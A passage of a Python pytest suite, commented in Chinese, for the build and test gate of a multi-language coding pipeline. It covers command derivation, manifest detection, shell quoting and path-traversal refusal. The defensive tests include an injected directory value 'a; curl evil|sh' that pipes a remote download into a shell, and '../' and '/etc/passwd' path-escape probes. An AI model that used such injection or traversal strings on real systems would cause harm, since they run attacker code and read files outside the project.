#!/usr/bin/env python3
"""X-H2 / X-H5 / X-H6 / X-H7 / X-H8（27 号文 §3.2 HIGH 簇）：执行期闸的多栈化。

四条同源病灶——**闸门自己对非 Maven 栈不在场**，于是要么"跳过＝通过"（假过），要么
"明知必失败仍执行"（127 → BLOCKED 空转）：

| 条 | 病灶 | 后果 |
|---|---|---|
| X-H2 | `_guess_test_cmd` 只认 `.py` | npm/go/rust 全返 None → `l1_3_test_ok=True` ＝**跳过即通过** |
| X-H5 | 跨栈误派豁免只做 Maven↔node 一个方向 | npm 工程收到 `mvn`、go 工程收到 `npm` → BLOCKED 空转 |
| X-H6 | 工具→清单表漏半个世界，未知工具一律放行 | `dotnet`/`sbt`/`make`/`composer` 空项目全 applicable → 127 |
| X-H7 | `template_for_language` 硬编 5 键而 language 是自由文本 | **Kotlin/Scala 是 JVM 栈却拿不到带 JDK 的镜像** |
| X-H8 | java 的 `file_signal` 硬编 `True` | 无栈画像时 Go/Rust/Python 每轮跑一遍 Java 修复族（**联网打 Maven Central**） |
"""
from __future__ import annotations

import importlib.util
from pathlib import Path

import pytest

_bs = Path(__file__).resolve().parent / "swarm_bootstrap.py"
_spec = importlib.util.spec_from_file_location("swarm_bootstrap", _bs)
_mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_mod)

import swarm.worker.l1_pipeline as lp  # noqa: E402
from swarm.config.settings import SandboxConfig  # noqa: E402


def _tree(root: Path, files: dict[str, str]) -> Path:
    for rel, body in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body)
    return root


# ══════════════════════════════════════════════
# X-H6：工具→清单表 + 未知工具可观测
# ══════════════════════════════════════════════

_XH6_TOOLS = [
    ("dotnet build", "Api.csproj", "<Project/>"),
    ("dotnet build", "App.sln", "sln"),
    ("./mvnw -q compile", "pom.xml", "<project/>"),
    ("mvnw -q compile", "pom.xml", "<project/>"),
    ("sbt compile", "build.sbt", 'name := "x"'),
    ("composer install", "composer.json", "{}"),
    ("bundle exec rake", "Gemfile", 'source "x"'),
    ("mix compile", "mix.exs", "defmodule X do end"),
    ("poetry install", "pyproject.toml", "[project]"),
    ("pipenv install", "Pipfile", "[packages]"),
    ("tsc --noEmit", "tsconfig.json", "{}"),
    ("make all", "Makefile", "all:\n\techo x"),
    ("cmake --build .", "CMakeLists.txt", "project(x)"),
    ("flutter build apk", "pubspec.yaml", "name: x"),
    ("swift build", "Package.swift", "// swift-tools"),
    ("bun run build", "package.json", "{}"),
]


@pytest.mark.parametrize("cmd,rel,body", _XH6_TOOLS,
                         ids=[f"{c.split()[0]}-{r}" for c, r, _ in _XH6_TOOLS])
def test_xh6_known_tool_rejected_without_manifest_accepted_with(cmd, rel, body, tmp_path):
    """★X-H6★ 缺清单必须判**不适用**（否则明知必失败仍执行 → 127 → BLOCKED 每轮同死），
    清单在场必须判**适用**（否则是新造的假跳过——闸门整块不跑）。两个方向一起断。"""
    empty = tmp_path / "empty"
    empty.mkdir()
    assert lp._build_cmd_applicable(cmd, str(empty)) is False, (
        f"{cmd!r} 在空项目上被判适用 ⇒ 真去跑 → 127 → BLOCKED 空转")
    full = _tree(tmp_path / "full", {rel: body})
    assert lp._build_cmd_applicable(cmd, str(full)) is True, (
        f"{cmd!r} 在有 {rel} 的工程上被判不适用 ⇒ 闸门整块跳过＝假过")


@pytest.mark.parametrize("cmd", [
    "python -m pytest", "pytest -q", "python3 -m compileall -q .",
    "javac X.java", "node index.js", "bash -c 'true'",
    # 注：`go vet` **不**在此列——它确实需要 go.mod，`go` 在清单表里是对的。
])
def test_xh6_no_manifest_tools_still_pass(cmd, tmp_path):
    """『本就不需要清单』的工具不许被误杀——fail-closed 一刀切会把 python/pytest 整类关掉。"""
    assert lp._build_cmd_applicable(cmd, str(tmp_path)) is True


def test_xh6_unknown_tool_passes_but_warns(tmp_path, caplog):
    """未知工具**仍放行**（不知道它要不要清单，误杀更坏），但必须响一次——原实现连一行日志
    都没有，于是"表该补了"这件事永远没人知道（硬检查④）。"""
    import logging
    with caplog.at_level(logging.WARNING):
        assert lp._build_cmd_applicable("zigbuild --release", str(tmp_path)) is True
    assert any("_BUILD_TOOL_MANIFESTS" in r.message or "X-H6" in r.message
               for r in caplog.records), "未知工具静默放行 ⇒ 表缺项无人察觉"


def test_xh6_known_no_manifest_tool_does_not_warn(tmp_path, caplog):
    """白名单里的工具不许刷 WARNING（正常路径变噪声会让真信号被埋掉）。"""
    import logging
    with caplog.at_level(logging.WARNING):
        lp._build_cmd_applicable("pytest -q", str(tmp_path))
    assert not [r for r in caplog.records if "_BUILD_TOOL_MANIFESTS" in r.message]


# ══════════════════════════════════════════════
# X-H2：_guess_test_cmd 多栈化（治"跳过＝通过"）
# ══════════════════════════════════════════════

_XH2_CASES = [
    ("go-scoped", {"go.mod": "module x", "svc/user.go": "package svc",
                   "svc/user_test.go": "package svc"},
     ["svc/user.go"], "go test ./svc/..."),
    ("go-project", {"go.mod": "module x", "main.go": "package main"},
     ["main.go"], "go test ./..."),
    ("npm-scoped", {"package.json": '{"scripts":{"test":"vitest run"}}',
                    "src/a.ts": "x", "src/a.test.ts": "x"},
     ["src/a.ts"], "npm test --silent"),
    ("npm-__tests__", {"package.json": '{"scripts":{"test":"jest"}}',
                       "src/a.ts": "x", "src/__tests__/a.test.ts": "x"},
     ["src/a.ts"], "npm test --silent"),
    ("rust", {"Cargo.toml": "[package]", "src/lib.rs": "x"},
     # 复核 HIGH-1：不加 `--offline`——冷沙箱里它必失败，且那句报错会被判成**代码错**
     ["src/lib.rs"], "cargo test -q"),
    ("py-scoped", {"pyproject.toml": "[project]", "app/a.py": "x",
                   "tests/test_a.py": "x"},
     ["app/a.py"], "python -m pytest -q tests/test_a.py"),
    ("py-project", {"pyproject.toml": "[project]", "app/a.py": "x"},
     ["app/a.py"], "python -m pytest -q --maxfail=1"),
]


@pytest.mark.parametrize("name,files,mods,want", _XH2_CASES,
                         ids=[c[0] for c in _XH2_CASES])
def test_xh2_guess_test_cmd_covers_every_stack(name, files, mods, want, tmp_path):
    """★X-H2★ 原实现只认 `.py`，其余栈一律 None ⇒ L1.3 落 `test_skipped` ＝**跳过即通过**，
    测试面对 npm/go/rust 整类不存在。"""
    root = _tree(tmp_path, files)
    assert lp._guess_test_cmd(str(root), mods) == want


def test_xh2_never_invents_npm_test_without_script(tmp_path):
    """★纪律 2（绝不猜）★ 无 `scripts.test` 时 `npm test` 报 `Missing script: "test"` 退出 1
    ⇒ 会把"项目没测试"误判成"测试失败"。宁可不猜。"""
    root = _tree(tmp_path, {"package.json": '{"name":"x"}', "src/a.ts": "x"})
    assert lp._guess_test_cmd(str(root), ["src/a.ts"]) is None


def test_xh2_rejects_npm_init_placeholder_test_script(tmp_path):
    """`npm init` 的默认 test 脚本是 `echo "Error: no test specified" && exit 1`
    ——**存在但必失败**，等价于没有，必须一起排除（否则每个 npm 工程都会被判测试失败）。"""
    root = _tree(tmp_path, {
        "package.json":
            '{"scripts":{"test":"echo \\"Error: no test specified\\" && exit 1"}}',
        "src/a.ts": "x"})
    assert lp._guess_test_cmd(str(root), ["src/a.ts"]) is None


def test_xh2_jvm_deliberately_not_guessed(tmp_path):
    """★刻意不猜 JVM★ `brain/nodes/shared.py` 给 java 的 `test_command` 是**故意留空**的
    （S1："RuoYi 等项目常无测试依赖，强跑必失败"）。在 `_guess_test_cmd` 里补 `mvn test` 会
    绕过那个决定，且直接打在唯一跑过 E2E 的栈上。要改得连同 S1 一起改。"""
    root = _tree(tmp_path, {"pom.xml": "<project/>",
                            "src/main/java/A.java": "class A {}",
                            "src/test/java/ATest.java": "class ATest {}"})
    assert lp._guess_test_cmd(str(root), ["src/main/java/A.java"]) is None


def test_xh2_project_file_exists_is_path_exact(tmp_path):
    """`_project_file_exists` 与 `_manifest_present` **语义不同**，别混用（X-H2 实测踩过）：
    后者是"深度≤3 内任意位置有没有这个名字"，本地兜底只查**工程根**；scoped 测试探测要问的是
    "`svc/user_test.go` 这个具体路径在不在"。"""
    _tree(tmp_path, {"svc/user_test.go": "package svc"})
    assert lp._project_file_exists("svc/user_test.go", str(tmp_path)) is True
    assert lp._project_file_exists("user_test.go", str(tmp_path)) is False
    # ★越界一律拒★ 路径来自改动清单/构建输出（外部输入）。
    # 夹具必须让 `..` **真的逃到一个存在的文件**，否则拆掉 `..` 闸也看不出区别
    # （突变实测：`../etc/passwd` 在 tmp 下解析不到任何东西 ⇒ 两种实现都返 False ⇒ 零区分力）。
    outside = tmp_path.parent / "xh2_outside_marker.txt"
    outside.write_text("secret")
    try:
        assert lp._project_file_exists(f"../{outside.name}", str(tmp_path)) is False, \
            "`..` 逃出工程根却判存在 ⇒ 探测面越界"
        assert lp._project_file_exists("svc/../../" + outside.name, str(tmp_path)) is False
    finally:
        outside.unlink(missing_ok=True)
    assert lp._project_file_exists("/etc/passwd", str(tmp_path)) is False


# ══════════════════════════════════════════════
# M-8：modified 派生路径进 shell 必须 quote
# ══════════════════════════════════════════════
#
# 27 号文 M-8：`_guess_test_cmd` 把 `modified` 的路径段**裸拼**进命令串，而同文件两个
# sibling（`:1570` 全角标点扫、`:1616` 伪空格扫）与 `_anchor` 都已 `shlex.quote`
# ——判据不对称。文件名含空格是完全合法的，裸拼会被 shell 切成两个 argv ⇒ 工具报的错
# 与真因无关 ⇒ 必被误诊成"测试失败"（非 infra ⇒ 硬 FAIL，sticky、换模型同死）。
#
# ★两条各锁一道闸，且都用 `shlex.split` 还原 argv 而非子串匹配★
# 子串匹配（`"'tests/test_a b.py'" in cmd`）会把"分词结果"这一维抹掉，是假探针宽度：
# 断言的是引号这个**字面量**而不是"shell 会不会切错"。还原 argv 断的才是真命题。


def test_m8_py_scoped_path_survives_shell_word_splitting(tmp_path):
    """py 臂：带空格的测试文件名必须作为**单个** argv 抵达 pytest。

    突变判据：把 `shlex.quote(c)` 换回裸 `{c}`，还原出的 argv 会变成
    ['python','-m','pytest','-q','tests/test_a','b.py'] ⇒ 本条红。
    """
    import shlex as _sh
    root = _tree(tmp_path, {"pyproject.toml": "[project]", "app/a b.py": "x",
                            "tests/test_a b.py": "x"})
    cmd = lp._guess_test_cmd(str(root), ["app/a b.py"])
    assert cmd is not None, "有同名 scoped 测试文件却没出命令"
    argv = _sh.split(cmd)
    assert argv[:4] == ["python", "-m", "pytest", "-q"]
    assert argv[4:] == ["tests/test_a b.py"], \
        f"路径被 shell 切碎或未 quote：{argv!r}"


def test_m8_go_scoped_pattern_survives_shell_word_splitting(tmp_path):
    """go 臂：带空格的目录段必须作为**单个** argv 抵达 go test。

    这里刻意**不**用 `_SAFE_REL_DIR_RE` 白名单挡：穿越面已被上游
    `_project_file_exists`（拒 `..`／绝对路径）拦掉，白名单唯一还活着的一格就是空格，
    而对这一格白名单只会把 scoped 退化成整仓兜底，quote 才保住精准。

    突变判据：去掉 quote → argv 变 ['go','test','./my','svc/...'] ⇒ 本条红。
    """
    import shlex as _sh
    root = _tree(tmp_path, {"go.mod": "module x", "my svc/user.go": "package svc",
                            "my svc/user_test.go": "package svc"})
    cmd = lp._guess_test_cmd(str(root), ["my svc/user.go"])
    assert cmd is not None, "有同包测试文件却没出命令（白名单把 scoped 退化成兜底了？）"
    argv = _sh.split(cmd)
    assert argv == ["go", "test", "./my svc/..."], \
        f"pattern 被 shell 切碎或未 quote：{argv!r}"


def test_m8_ordinary_paths_are_left_byte_identical(tmp_path):
    """★反向锁：quote 不得给常规路径引入引号★

    `shlex.quote` 对 `[A-Za-z0-9._/-]` 恒为恒等变换，所以既有断言（`go test ./svc/...`、
    `python -m pytest -q tests/test_a.py`）必须**逐字节不变**。这条同时是防"过度 quote"
    ——若有人改成无条件加引号，日志可读性与既有 7 格 parametrize 会一起碎。
    """
    root = _tree(tmp_path, {"go.mod": "module x", "svc/user.go": "package svc",
                            "svc/user_test.go": "package svc"})
    assert lp._guess_test_cmd(str(root), ["svc/user.go"]) == "go test ./svc/..."
    root2 = _tree(tmp_path / "p2", {"pyproject.toml": "[project]", "app/a.py": "x",
                                    "tests/test_a.py": "x"})
    assert lp._guess_test_cmd(str(root2), ["app/a.py"]) == "python -m pytest -q tests/test_a.py"


# ══════════════════════════════════════════════
# X-H5：跨栈误派（治法 D 之后的剩余面）
# ══════════════════════════════════════════════

_XH5_CASES = [
    ("npm 工程被误派 mvn", {"package.json": '{"name":"a"}', "tsconfig.json": "{}",
                            "src/app.ts": "export const x=1;"},
     "mvn -q -DskipTests compile", ["src/app.ts"], "tsc --noEmit"),
    ("go 工程被误派 npm", {"go.mod": "module x\n\ngo 1.22\n",
                           "main.go": "package main\nfunc main(){}"},
     "npm run build", ["main.go"], "go build ./..."),
    ("rust 工程被误派 mvn", {"Cargo.toml": "[package]\nname='x'\n",
                             "src/main.rs": "fn main(){}"},
     "mvn -q -DskipTests compile", ["src/main.rs"], "cargo build -q"),
]


@pytest.mark.parametrize("name,files,wrong_cmd,mods,want", _XH5_CASES,
                         ids=[c[0] for c in _XH5_CASES])
def test_xh5_misdispatched_command_is_reroutable(name, files, wrong_cmd, mods, want,
                                                 tmp_path):
    """★X-H5（治法 D 已覆盖的部分）★ 误派命令必须 ①被判不适用（不去跑它）②derive 能按**真实
    清单**给出正确命令。两者齐备时 L1 的治法 D 判据就会自动改派 —— 这是本条的立论基础，
    故直接把这两个事实钉住（治法 D 的管线级断言在 test_image_builder.py）。"""
    root = _tree(tmp_path, files)
    assert lp._build_cmd_applicable(wrong_cmd, str(root)) is False, "误派命令竟被判适用"
    assert lp._derive_full_build_command(str(root), mods, None) == want


# ══════════════════════════════════════════════
# X-H7：template_for_language 归一
# ══════════════════════════════════════════════

_XH7_FAMILY = [
    ("kotlin", "java"), ("kt", "java"), ("scala", "java"), ("groovy", "java"),
    ("Spring Boot (java)", "java"), ("gradle", "java"), ("maven", "java"),
    ("typescript", "node"), ("ts", "node"), ("TypeScript + Vue", "node"),
    ("vue", "node"), ("react", "node"), ("javascript", "node"), ("nestjs", "node"),
    ("django", "python"), ("fastapi", "python"), ("py", "python"),
    ("golang", "go"), ("Gin (go)", "go"),
    ("cargo", "rust"), ("axum", "rust"),
]


@pytest.mark.parametrize("raw,fam", _XH7_FAMILY, ids=[r for r, _ in _XH7_FAMILY])
def test_xh7_free_text_language_maps_to_toolchain_family(raw, fam):
    """★X-H7★ `harness.language` 是 LLM 可写的自由文本，而模板表只有 5 个精确键。
    ★Kotlin/Scala 尤其刺眼：JVM 栈却拿不到带 JDK/Maven 的 java 镜像★ ⇒ 子任务在没有编译器的
    镜像里跑。归一判据＝"跑它需要哪套工具链"。"""
    assert SandboxConfig.canonical_template_language(raw) == fam


@pytest.mark.parametrize("raw", ["csharp", "elixir", "dart", "ruby", "php", ""])
def test_xh7_unknown_language_falls_back_honestly(raw):
    """真不认识的返空串 → 调用方回退 default（fail-honest，绝不硬塞一个族：把 csharp 塞进
    java 族会让它拿到 JDK 镜像却没有 dotnet，与 X-C2 同族的"工具不在场"）。"""
    assert SandboxConfig.canonical_template_language(raw) == ""


def test_xh7_kotlin_gets_the_same_image_as_java():
    """归一必须**真的改变模板解析结果**，不能只是有个 helper（接线覆盖 ≠ 机制存在）。"""
    c = SandboxConfig()
    assert c.template_for_language("kotlin") == c.template_for_language("java")
    assert c.template_for_language("typescript") == c.template_for_language("node")
    # 且不该是 default（那正是 X-H7 的病）
    assert c.template_for_language("kotlin") != c.default_template


# ══════════════════════════════════════════════
# X-H8：Java 修复族的 file_signal 不再恒真
# ══════════════════════════════════════════════

def test_xh8_java_repair_family_not_invoked_on_non_jvm_build(tmp_path, monkeypatch):
    """★X-H8 的**接线**断言（突变逼出来的）★ 上一条只测正则＝证实现，把
    `eligible("java", _jvm_signal)` 改回写死 `True` 它照旧绿。本条走 `_attempt_build_repair`
    本体，断言无栈画像 + 非 JVM 构建输出时 **Java 修复族一个都不被调用**——其中
    `_attempt_dependency_repair` 会联网打 Maven Central。
    """
    called: list[str] = []
    for fn in ("_attempt_import_repair", "_attempt_internal_import_drift_repair",
               "_attempt_dependency_repair", "_attempt_maven_version_repair"):
        monkeypatch.setattr(lp, fn,
                            (lambda name: lambda *a, **k: (called.append(name), (0, []))[1])(fn))
    # 其余栈的修复器一律短路，免得它们真去跑外部工具
    for fn in ("_repair_go", "_repair_ts", "_repair_rust", "_attempt_pseudospace_repair"):
        if hasattr(lp, fn):
            monkeypatch.setattr(lp, fn, lambda *a, **k: (0, []))

    go_out = "internal/handler/user.go:7:2: no required module provides package x\n"
    lp._attempt_build_repair(str(tmp_path), go_out, ["main.go"], 30, None)
    assert called == [], f"无栈画像 + Go 构建输出，仍唤起了 Java 修复族: {called}"

    # 反向臂：真 JVM 输出必须唤起（否则是把闸拧成恒关＝Java 修复整族失效）
    called.clear()
    jvm_out = "[ERROR] /p/src/main/java/com/acme/A.java:[7,25] package x does not exist\n"
    lp._attempt_build_repair(str(tmp_path), jvm_out, ["A.java"], 30, None)
    assert called, "JVM 构建输出却没唤起 Java 修复族 ⇒ 闸被拧成恒关"


def test_xh8_jvm_repair_signal_requires_real_evidence():
    """★X-H8★ 原实现 `eligible("java", True)` 写死常量 ⇒ 无栈画像时 Go/Rust/Python 工程**每轮**
    跑一遍 Java 修复族，其中 `_attempt_dependency_repair` 会**联网打 Maven Central 全文检索**
    ⇒ 白付网络往返与超时预算，而无栈画像恰恰是最该省的时候。
    判据换成"构建输出里真出现 JVM 源文件"——既保住原意（modified 没列出也认），又不再恒真。"""
    assert lp._JVM_SRC_IN_TEXT_RE.search(
        "[ERROR] /p/src/main/java/com/acme/A.java:[7,25] package x does not exist")
    assert lp._JVM_SRC_IN_TEXT_RE.search("Foo.kt:12:5: error: unresolved reference")
    assert lp._JVM_SRC_IN_TEXT_RE.search("bar/Baz.scala:3: error")
    # 非 JVM 的构建输出不许命中（命中即 Java 修复族又被无条件唤起）
    for txt in ("internal/handler/user.go:7:2: no required module provides package x",
                "src/app.ts(3,24): error TS2307: Cannot find module './x'",
                "error[E0432]: unresolved import `crate::svc`",
                "ModuleNotFoundError: No module named 'app.services.user'"):
        assert not lp._JVM_SRC_IN_TEXT_RE.search(txt), f"非 JVM 输出命中了 JVM 判据: {txt[:40]}"


# ══════════════════════════════════════════════
# X-H1 + N-4 + N-2：_derive_full_build_command 多栈化 + 跨栈污染
# ══════════════════════════════════════════════

def _PY_PER_FILE(*files: str) -> str:
    """决定 1 后 python 闸的命令形态（逐个编译改动文件）。"""
    return ("for f in " + " ".join(files)
            + ' ; do python3 -m compileall -q "$f" || exit 1; done').replace(" ; ", "; ")

_XH1_CASES = [
    # X-H1：npm 改 .js/.jsx/.vue —— 原先只认 .ts/.tsx+tsconfig ⇒ 这些形态零构建闸
    ("npm-js", {"package.json": '{"scripts":{"build":"vite build"}}', "src/a.js": "x"},
     ["src/a.js"], "npm run build --if-present"),
    ("npm-vue", {"package.json": '{"scripts":{"build":"vite build"}}', "src/A.vue": "x"},
     ["src/A.vue"], "npm run build --if-present"),
    ("npm-jsx", {"package.json": '{"scripts":{"build":"webpack"}}', "src/a.jsx": "x"},
     ["src/a.jsx"], "npm run build --if-present"),
    # tsconfig 在场时仍优先 tsc（最强的确定性类型闸）
    ("ts-prefers-tsc", {"tsconfig.json": "{}", "package.json": '{"scripts":{"build":"x"}}',
                        "src/a.ts": "x"}, ["src/a.ts"], "tsc --noEmit"),
    # N-4：python 原先**没有任何分支**
    # ★决定 1（用户拍板）★ python 闸只编译**改动文件**（与 PHP/Ruby 同口径）。
    # 演进：整树 → 加 `-x` 排除表 → 逐文件。逐文件之后**不需要任何排除表**，
    # 也不会被 linter 仓刻意 ship 的坏语法夹具冤枉（见 test_d1_...）。
    ("py-pyproject", {"pyproject.toml": "[project]", "app/a.py": "x"},
     ["app/a.py"], _PY_PER_FILE("app/a.py")),
    ("py-requirements", {"requirements.txt": "flask", "app/a.py": "x"},
     ["app/a.py"], _PY_PER_FILE("app/a.py")),
    ("py-setuppy", {"setup.py": "from setuptools import setup", "app/a.py": "x"},
     ["app/a.py"], _PY_PER_FILE("app/a.py")),
    # N-2：go.work 多模块仓
    ("go-work", {"go.work": "use ./a\n", "a/go.mod": "module a", "a/m.go": "package a"},
     ["a/m.go"], "go build ./..."),
    # X-H1：其余栈
    ("csharp-root", {"Api.csproj": "<Project/>", "A.cs": "class A{}"},
     ["A.cs"], "dotnet build --nologo -v q"),
    # 复核 M-5：不把 warning 致命化——既有工程一片 warning 会让闸每轮判死，且混淆
    # "代码质量"与"能不能编译"（其余栈的 go build/cargo build/dotnet build 都不这么做）
    ("elixir", {"mix.exs": "defmodule X do end", "lib/a.ex": "x"},
     ["lib/a.ex"], "mix compile"),
    ("dart", {"pubspec.yaml": "name: x", "lib/a.dart": "x"},
     ["lib/a.dart"], "dart analyze --no-fatal-warnings"),
    # 回归臂：JVM 基线逐字节不变
    ("regress-maven", {"pom.xml": "<project/>", "src/main/java/A.java": "class A{}"},
     ["src/main/java/A.java"], "mvn -q -DskipTests compile"),
    ("regress-gradle", {"build.gradle": "plugins{id 'java'}", "gradlew": "#!/bin/sh",
                        "src/main/java/A.java": "class A{}"},
     ["src/main/java/A.java"], "./gradlew -q classes 2>/dev/null || gradle -q classes"),
    ("regress-rust", {"Cargo.toml": "[package]", "src/main.rs": "fn main(){}"},
     ["src/main.rs"], "cargo build -q"),
]


@pytest.mark.parametrize("name,files,mods,want", _XH1_CASES, ids=[c[0] for c in _XH1_CASES])
def test_xh1_derive_covers_every_stack(name, files, mods, want, tmp_path):
    """★X-H1 + N-4 + N-2★ `_derive_full_build_command` 原是 ext×manifest×build 的 if 链：
    npm 改 `.js/.vue`、python（**整个栈没有分支**）、C#/PHP/Ruby/Elixir/Dart、go.work 多模块
    → 全部返 `''` ＝**零构建闸**（改坏了也没人拦）。回归臂钉住 JVM/rust 逐字节不变。"""
    root = _tree(tmp_path, files)
    assert lp._derive_full_build_command(str(root), mods, None) == want


def test_xh1_never_invents_npm_build_without_script(tmp_path):
    """★纪律 2★ 无 `scripts.build` 时不下发 `npm run build`。虽然 `--if-present` 会让它退出 0，
    但那等于"闸门静默不跑"＝假过；返 `''` 才是诚实的"派生不出"。"""
    root = _tree(tmp_path, {"package.json": '{"name":"x"}', "src/a.js": "x"})
    assert lp._derive_full_build_command(str(root), ["src/a.js"], None) == ""


_POLLUTION = [
    ("maven+tools/go.mod", {"pom.xml": "<project/>", "tools/go.mod": "module t",
                            "tools/m.go": "package t"},
     ["tools/m.go"], "cd tools && go build ./..."),
    ("csharp 在子目录", {"src/Api.csproj": "<Project/>", "src/A.cs": "class A{}"},
     ["src/A.cs"], "cd src && dotnet build --nologo -v q"),
]


@pytest.mark.parametrize("name,files,mods,want", _POLLUTION, ids=[c[0] for c in _POLLUTION])
def test_xh1_cross_stack_pollution_anchors_to_manifest_dir(name, files, mods, want, tmp_path):
    """★X-H1 跨栈污染★ 实测形态：Maven 单体里有个 `tools/go.mod`，子任务只改 `.go` ⇒ 旧实现在
    **工程根**下发 `go build ./...` ⇒ 根没有 go.mod，命令必失败 → 127 → BLOCKED。
    治法：命令锚到**清单所在目录**（`cd tools && …`），而不是假定清单在根。"""
    root = _tree(tmp_path, files)
    assert lp._derive_full_build_command(str(root), mods, None) == want


def test_xh1_unsafe_manifest_dir_is_refused(tmp_path, monkeypatch, caplog):
    """目录名来自工程树（外部输入）⇒ 形态不安全就不拼进 shell 命令（S-5 同源判据）。"""
    import logging
    # 锚点现在由 `_manifest_dir_for`（据 modified 反查）给出，故打桩它
    monkeypatch.setattr(lp, "_manifest_dir_for",
                        lambda mods, names, pp, evidence=None: "a; curl evil|sh")
    monkeypatch.setattr(lp, "_manifest_dir", lambda names, pp: "a; curl evil|sh")
    root = _tree(tmp_path, {"go.mod": "module x", "m.go": "package main"})
    with caplog.at_level(logging.WARNING):
        got = lp._derive_full_build_command(str(root), ["m.go"], None)
    assert got == "", "不安全目录名被拼进了命令"
    assert any("形态不安全" in r.message for r in caplog.records)


def test_xh1_manifest_present_local_matches_sandbox_semantics(tmp_path):
    """★本地兜底必须与沙箱分支同口径（X-H1 实测发现两者不一致）★
    沙箱是 `find -maxdepth 3 \\( -name a -o -name b \\)`：递归到深度 3 且 `-name` 支持 glob。
    原本地实现只看工程根、且把 `*.csproj` 当字面名 ⇒ 子目录清单与整个 C# 栈在本地判 False，
    而沙箱判 True ⇒ **测试在本地绿而生产另一套行为**（本战役反复吃的形态）。"""
    _tree(tmp_path, {"tools/go.mod": "module t", "src/Api.csproj": "<Project/>"})
    assert lp._manifest_present(("go.mod",), str(tmp_path)) is True, "子目录清单漏判"
    assert lp._manifest_present(("*.csproj",), str(tmp_path)) is True, "glob 不生效"
    assert lp._manifest_present(("nope.toml",), str(tmp_path)) is False
    # ★复核 M-4★ 上面两个正例都在**深度 2**（`_d=1` 就满足）⇒ 深度上界根本没被断言。
    # 沙箱是 `find -maxdepth 3`，故必须钉住"深度 3 命中、深度 4 不命中"这条边界，
    # 否则 `range(1,3)` 写成 `range(1,2)` 也照旧全绿（夹具形状没编码边界）。
    _tree(tmp_path, {"a/b/deep3.toml": "x", "a/b/c/deep4.toml": "x",
                     "a/b/d3.csproj": "<Project/>", "a/b/c/d4.csproj": "<Project/>"})
    assert lp._manifest_present(("deep3.toml",), str(tmp_path)) is True, "深度 3 漏判"
    assert lp._manifest_present(("deep4.toml",), str(tmp_path)) is False, "深度 4 竟命中"
    assert lp._manifest_present(("d3.csproj",), str(tmp_path)) is True
    # glob 分支的深度覆盖必须与非 glob 分支一致
    assert lp._manifest_present(("d4.csproj",), str(tmp_path)) is False, \
        "glob 分支的深度上界与非 glob 分支不一致"


# ══════════════════════════════════════════════
# reviewer 复核整改（C-1/C-2/H-3/H-4/M-2/M-3/M-7）
# ══════════════════════════════════════════════

def test_c1_php_ruby_gate_actually_checks_every_modified_file(tmp_path):
    """★复核 C-1★ 原写法 `ruby -c $(git ls-files '*.rb' | head -200)` 是**必然假过**，三重叠加：
    ① 沙箱 `/workspace` 不是 git 仓库（`.git` 在 `_SRC_EXCLUDE_DIRS`、`git archive` 也不带）
       ⇒ `git ls-files` 失败、命令替换为空；
    ② `ruby -c`/`php -l` **零参数读 stdin** ⇒ 空 stdin ⇒ `Syntax OK` **退出 0**；
    ③ `ruby -c a.rb b.rb` **只检查 a.rb**（实测 b.rb 有语法错仍 rc=0）。
    后果比改动前更坏：改前是 `build_skipped` 留痕，改后闸"跑了"且 PASS，**零机读键说明什么都没查**。
    """
    import subprocess
    root = _tree(tmp_path, {"Gemfile": 'source "x"', "ok.rb": "puts 1\n",
                            "bad.rb": "def x(\n"})
    cmd_ok = lp._derive_full_build_command(str(root), ["ok.rb"], None)
    assert "git ls-files" not in cmd_ok, "仍依赖 git（沙箱里不是 git 仓库）"
    assert subprocess.run(["sh", "-c", cmd_ok], cwd=root, capture_output=True,
                          stdin=subprocess.DEVNULL).returncode == 0
    # ★坏文件排在第二个★ 原实现只查第一个参数 ⇒ 这条能抓到那个缺陷
    cmd_bad = lp._derive_full_build_command(str(root), ["ok.rb", "bad.rb"], None)
    assert subprocess.run(["sh", "-c", cmd_bad], cwd=root, capture_output=True,
                          stdin=subprocess.DEVNULL).returncode != 0, \
        "第二个文件的语法错没被抓到 ⇒ 逐文件检查没落地"


def test_c1_no_gate_when_no_such_source_modified(tmp_path):
    """只改了非 PHP 文件时不该出 PHP 命令（`for f in ; do` 是空循环＝假过）。"""
    root = _tree(tmp_path, {"composer.json": "{}", "README.md": "x"})
    assert lp._derive_full_build_command(str(root), ["README.md"], None) == ""


_C2_CASES = [
    ("java 子任务", {"pom.xml": "<project/>", "tools/pyproject.toml": "[project]",
                     "src/main/java/A.java": "class A{}"}, ["src/main/java/A.java"]),
    ("前端子任务", {"pom.xml": "<project/>", "backend/pyproject.toml": "[project]",
                    "web/src/a.js": "x"}, ["web/src/a.js"]),
]


@pytest.mark.parametrize("name,files,mods", _C2_CASES, ids=[c[0] for c in _C2_CASES])
def test_c2_nested_pyproject_does_not_hijack_other_stacks(name, files, mods, tmp_path):
    """★复核 C-2★ python 测试兜底原先**没有语言守卫**且排在最前 ⇒ 任何深度≤3 的
    `pyproject.toml`（含 `tools/`、`node_modules/**`）劫持**所有栈**的测试闸 ⇒ java/前端子任务
    被下发根级 `pytest` ⇒ 收集不到用例 rc=5 ⇒ 非 infra ⇒ **硬 FAIL**（sticky，换模型同死）。
    而 `backend/pyproject.toml` + `frontend/` 正是本战役的目标形态。"""
    root = _tree(tmp_path, files)
    got = lp._guess_test_cmd(str(root), mods)
    assert got is None or "pytest" not in got, f"非 python 子任务被下发了 pytest: {got!r}"


def test_c2_python_subtask_still_gets_pytest(tmp_path):
    """反向臂：真改 `.py` 仍要拿到 pytest（别把守卫拧成恒关）。"""
    root = _tree(tmp_path, {"pyproject.toml": "[project]", "app/a.py": "x"})
    assert lp._guess_test_cmd(str(root), ["app/a.py"]) == "python -m pytest -q --maxfail=1"


def test_h3_ts_arm_does_not_kill_later_fallbacks(tmp_path):
    """★复核 H-3★ `.ts` 臂原来是 `return ... else None`：没有 `scripts.test` 时**直接 return
    None**，把后面 go/rust/python 的工程级兜底整块掐死 ⇒ 混栈子任务静默退回 `test_skipped`
    ＝跳过即通过，正是 X-H2 要治的假过。"""
    root = _tree(tmp_path, {"package.json": '{"name":"x"}',      # 无 scripts.test
                            "src/a.ts": "x", "src/a.test.ts": "x",
                            "go.mod": "module x", "svc/user.go": "package svc"})
    assert lp._guess_test_cmd(str(root), ["src/a.ts", "svc/user.go"]) == "go test ./...", \
        ".ts 臂的 return 掐死了 go 兜底"


_H4_COMPOSITE = [("Java 17", "java"), ("Go 1.21 service", "go"),
                 ("Python 3.11", "python"), ("Rust (edition 2021)", "rust"),
